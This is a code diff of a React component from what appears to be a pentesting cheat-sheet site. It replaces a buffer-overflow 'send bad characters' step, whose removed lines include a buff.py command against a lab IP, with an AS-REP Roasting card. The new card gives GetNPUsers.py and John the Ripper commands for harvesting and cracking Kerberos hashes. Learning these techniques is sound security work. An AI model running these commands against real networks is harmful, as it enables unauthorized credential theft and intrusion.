@@ -13,7 +13,7 @@ interface IProps {
   title: string;
 }
 
-const BufferOverflowStep4 = ({ title }: IProps) => {
+const AS_REP_Roasting = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -33,19 +33,21 @@ const BufferOverflowStep4 = ({ title }: IProps) => {
               color: "primary.main",
             }}
           >
-            <Typography variant="h6">Send Bad Characters</Typography>
+            <Typography variant="h6">Description</Typography>
             <Typography>
-              The command below will send a bytearray to the program, we can
-              then use mona.py to determine which characters are bad characters.
+              If Kerberos Pre-Authentication is Disabled, then AS-REP Roasting
+              is possible.
             </Typography>
+            <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Step 1</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"python buff.py --chars -d 10.10.253.128 -p 1337 -o 634"}
+              {"GetNPUsers.py {DOMAIN}/{USER} -dc-ip={IP}"}
             </SyntaxHighlighter>
-            <Box sx={{ m: 2 }} />
-            <Typography>
-              After sending the payload, check that the EIP register is equal to
-              42424242 (all B's). Otherwise your offset value is incorrect.
-            </Typography>
+            <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Step 2</Typography>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {"john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"}
+            </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
       </Accordion>
@@ -53,4 +55,4 @@ const BufferOverflowStep4 = ({ title }: IProps) => {
   );
 };
 
-export default BufferOverflowStep4;
+export default AS_REP_Roasting;
